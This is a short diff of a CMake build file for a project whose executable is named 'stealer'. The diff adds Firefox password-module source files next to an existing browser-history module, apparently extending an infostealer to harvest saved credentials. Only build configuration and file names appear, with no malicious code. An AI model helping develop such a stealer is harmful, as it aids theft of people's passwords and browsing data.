@@ -105,6 +105,8 @@ add_executable(stealer src/main.cpp
         src/utils/SQLiteUtil.h
         src/stealer/impl/browsers/firefox/impl/FHistory.cpp
         src/stealer/impl/browsers/firefox/impl/FHistory.h
+        src/stealer/impl/browsers/firefox/impl/FPasswords.cpp
+        src/stealer/impl/browsers/firefox/impl/FPasswords.h
 )
 
 target_link_libraries(stealer
